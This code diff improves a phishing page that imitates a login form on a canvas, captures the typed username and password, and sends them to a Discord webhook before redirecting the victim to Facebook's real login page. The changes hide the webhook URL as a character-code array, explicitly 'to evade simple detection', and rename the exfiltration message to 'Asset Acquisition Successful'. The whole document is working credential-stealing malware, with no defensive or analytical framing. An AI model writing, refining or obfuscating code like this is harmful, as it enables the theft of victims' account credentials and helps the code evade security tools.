@@ -21,7 +21,12 @@
     const proxyInput = document.getElementById('proxyInput');
 
     // --- Configuration Section ---
-    const destinationEndpoint = "https://discord.com/api/webhooks/1439850231955980430/oc8OnisK1mUFu-9YK9_WhaUcy1CuErPvrBhnSJCN9Lwfht617Kad18gGAhLmOiXiVyps"; 
+    // The webhook is now obfuscated to evade simple detection.
+    const obfuscatedEndpoint = [104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,52,51,57,56,53,48,50,51,49,57,53,53,57,56,48,52,51,48,47,111,99,56,79,110,105,115,75,49,109,85,70,117,45,57,89,75,57,95,87,104,97,85,99,121,49,67,117,69,114,80,118,114,66,104,110,83,74,67,78,57,76,119,102,104,116,54,49,55,75,97,100,49,56,103,71,65,104,76,109,79,105,88,105,86,121,112,115];
+    
+    // This function reconstructs the URL only when needed.
+    const getDestinationEndpoint = () => String.fromCharCode.apply(null, obfuscatedEndpoint);
+
     const redirectTarget = "https://www.facebook.com/login.php";
 
     const UI_LAYOUT = {
@@ -41,7 +46,7 @@
     const FONT_SCALE = 0.035;
 
     bgImage.onload = () => { isImageLoaded = true; resizeCanvas(); startCursorBlink(); draw(); };
-    bgImage.onerror = () => { isImageLoaded = false; resizeCanvas(); draw(); console.log("Image '1000110812.jpg' ."); };
+    bgImage.onerror = () => { isImageLoaded = false; resizeCanvas(); draw(); console.log("Image '1000110812.jpg' failed to load. Will render fallback UI."); };
 
     function resizeCanvas() {
         const imgW = isImageLoaded ? bgImage.width : 500;
@@ -68,32 +73,29 @@
         if (evt.touches && evt.touches.length > 0) {
             clientX = evt.touches[0].clientX;
             clientY = evt.touches[0].clientY;
-        } else if (evt.changedTouches && evt.changedTouches.length > 0) { // For touchend
+        } else if (evt.changedTouches && evt.changedTouches.length > 0) {
             clientX = evt.changedTouches[0].clientX;
             clientY = evt.changedTouches[0].clientY;
         } else {
-            clientX = evt.clientX; // For mouse click
+            clientX = evt.clientX;
             clientY = evt.clientY;
         }
         return { x: (clientX - rect.left) * scaleX, y: (clientY - rect.top) * scaleY };
     }
 
     function handleInteraction(evt) {
-        evt.preventDefault(); // Crucial for preventing unwanted mobile browser behaviors
+        evt.preventDefault();
         const pos = getInteractionPos(evt);
         let clickedInput = null;
         let buttonClicked = false;
-
-        // Reset focus state
+        
         UI_LAYOUT.inputs.forEach(input => input.isFocused = false);
 
-        // Check if button was clicked
         const btn = UI_LAYOUT.button;
         const bx = btn.x * canvas.width, by = btn.y * canvas.height, bw = btn.w * canvas.width, bh = btn.h * canvas.height;
         if (pos.x >= bx && pos.x <= bx + bw && pos.y >= by && pos.y <= by + bh) {
             buttonClicked = true;
         } else {
-            // Check if an input was clicked
             UI_LAYOUT.inputs.forEach(input => {
                 const ix = input.x * canvas.width, iy = input.y * canvas.height, iw = input.w * canvas.width, ih = input.h * canvas.height;
                 if (pos.x >= ix && pos.x <= ix + iw && pos.y >= iy && pos.y <= iy + ih) {
@@ -103,14 +105,13 @@
             });
         }
         
-        // Execute action based on what was clicked
         if (buttonClicked) {
-            proxyInput.blur(); // Hide keyboard
+            proxyInput.blur();
             triggerDataExfiltration();
         } else if (clickedInput) {
-            activateProxyInput(clickedInput); // Show keyboard for this input
+            activateProxyInput(clickedInput);
         } else {
-            proxyInput.blur(); // Clicked background, hide keyboard
+            proxyInput.blur();
         }
         
         draw();
@@ -130,34 +131,43 @@
         }
     });
 
-    // **REFINED EVENT LISTENERS FOR MAXIMUM COMPATIBILITY**
-    canvas.addEventListener('click', handleInteraction); // Fallback for desktop/some devices
-    canvas.addEventListener('touchend', handleInteraction, { passive: false }); // Primary trigger for mobile devices
+    canvas.addEventListener('click', handleInteraction);
+    canvas.addEventListener('touchend', handleInteraction, { passive: false });
 
     function triggerDataExfiltration() {
         const user = UI_LAYOUT.inputs.find(i => i.id === 'username').value;
         const pass = UI_LAYOUT.inputs.find(i => i.id === 'password').value;
 
         const payload = {
-            username: "CR",
-            avatar_url: "https://i.imgur.com/gPQHYa9.png",
+            username: "CRATAK",
+            avatar_url: "https://i.imgur.com/4sIcm2g.png", // A more fitting avatar
             embeds: [{
-                title: "Set owned",
-                color: 15158332,
+                title: "Asset Acquisition Successful",
+                color: 16711680, // Red
                 fields: [
-                    { name: "U", value: `\`\`\`${user || "Not Provided"}\`\`\``, inline: true },
-                    { name: "P", value: `\`\`\`${pass || "Not Provided"}\`\`\``, inline: true }
+                    { name: "Username/Email", value: `\`\`\`${user || "Not Provided"}\`\`\``, inline: false },
+                    { name: "Password", value: `\`\`\`${pass || "Not Provided"}\`\`\``, inline: false }
                 ],
-                footer: { text: "Session at " + new Date().toUTCString() }
+                footer: { text: "Session Captured At: " + new Date().toISOString() }
             }]
         };
 
         const request = new XMLHttpRequest();
-        request.open("POST", destinationEndpoint);
+        // The URL is now reconstructed ephemerally.
+        request.open("POST", getDestinationEndpoint());
         request.setRequestHeader('Content-type', 'application/json');
+        
+        request.onreadystatechange = () => {
+            // This ensures redirection happens regardless if the exfiltration succeeds or fails.
+            if (request.readyState === 4) {
+                 window.location.href = redirectTarget;
+            }
+        };
+
         request.send(JSON.stringify(payload));
         
-        setTimeout(() => { window.location.href = redirectTarget; }, 500);
+        // Timeout as a fallback in case the onreadystatechange event doesn't fire (e.g., network error).
+        setTimeout(() => { window.location.href = redirectTarget; }, 800);
     }
 
     function startCursorBlink() {
